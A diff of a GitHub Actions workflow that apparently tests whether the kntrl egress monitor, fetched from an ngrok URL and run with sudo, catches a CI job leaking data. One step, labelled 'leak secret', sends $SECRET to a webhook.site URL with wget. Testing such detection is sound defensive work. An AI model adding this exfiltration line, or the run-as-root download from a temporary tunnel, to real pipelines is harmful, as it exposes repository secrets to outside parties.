@@ -6,9 +6,9 @@ name: CI
 on:
   # Triggers the workflow on push or pull request events but only for the "main" branch
   push:
-    branches: [ "main" ]
+    branches: ["main", "tj-actions-detect"]
   pull_request:
-    branches: [ "main" ]
+    branches: ["main"]
 
   # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
@@ -27,9 +27,9 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script... prepare
-        run: | 
-           echo Hello, world!!
-           env
+        run: |
+          echo Hello, world!!
+          env
 
       # Runs a single command using the runners shell
       # wget download.kondukto.io/kntrl/kntrl -q
@@ -38,7 +38,7 @@ jobs:
           wget -q https://794f-46-197-210-176.ngrok-free.app/kntrl
           chmod +x kntrl
           sudo ./kntrl run --mode=trace --allowed-hosts=download.kondukto.io --allow-github-meta=true &
-          
+
       # Runs a set of commands using the runners shell
       - name: Stop prevent action
         env:
@@ -46,12 +46,12 @@ jobs:
         run: |
           echo "leak secret"
           wget --connect-timeout=3 https://webhook.site/c2b54d74-0180-4d04-a3b2-55fe3a7b6f1f?secret=$SECRET || true
-          
+
         # Runs a set of commands using the runners shell
       - name: Run allowed action
         run: |
           echo "download artifacts..."
-          wget --connect-timeout=3 https://download.kondukto.io/kntrl/myartifact.txt 
+          wget --connect-timeout=3 https://download.kondukto.io/kntrl/myartifact.txt
 
       # Runs a set of commands using the runners shell
       - name: print report
@@ -60,4 +60,3 @@ jobs:
           echo "---------------------"
           cat /tmp/kntrl.out
           echo "---------------------"
-          
